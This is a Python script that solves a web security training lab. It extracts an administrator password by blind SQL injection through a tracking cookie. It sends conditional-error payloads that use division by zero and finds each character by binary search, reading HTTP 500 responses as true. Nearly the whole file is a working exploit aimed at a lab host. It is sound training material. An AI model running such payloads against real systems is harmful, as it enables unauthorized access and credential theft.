# lab 12 - Injection With Conditional Errors

import requests
import urllib3

urllib3.disable_warnings()

TARGET_URL = "https://0a04002604ab63ab80a108ef004b0004.web-security-academy.net/"
TRACKING_ID = "vIq6LqY8K0cXyaHq"
SESSION_COOKIE = "dxjxFBznut4KPt1qFRWGLHP7c1dSgAnl"
MAX_LEN = 30

def send_payload(payload):
    cookies = {
        "TrackingId": TRACKING_ID + payload,
        "session": SESSION_COOKIE
    }

    r = requests.get(TARGET_URL, cookies=cookies, verify=False)
    print(f"status: {r.status_code} | len: {len(r.text)}")
    return r.status_code == 500

def check_position_exists(pos):
    payload = f"' AND (SELECT CASE WHEN LENGTH(password) >= {pos} THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator' ) = 'a' -- -"
    return send_payload(payload)

def get_char(position):
    low = 48
    high = 122

    while low <= high:
        mid = (low + high) // 2
        payload = f"' AND (SELECT CASE WHEN ASCII(SUBSTR(password,{position},1)) > {mid} THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator' ) = 'a' -- -"
        if send_payload(payload):
            low = mid + 1
        else:
            high = mid - 1
    if not check_position_exists(position):
        return None

    return chr(low)


def main():
    print("[*] Dumping password with binary search...")
    password = ""
    for i in range(1, MAX_LEN + 1):
        if not check_position_exists(i):
            print(f"len: {i-1}")
            break
        char = get_char(i)
        print(f"char: {char}")
        password += char

    print(f"\n PASSWORD: {password}")

if __name__ == "__main__":
   main()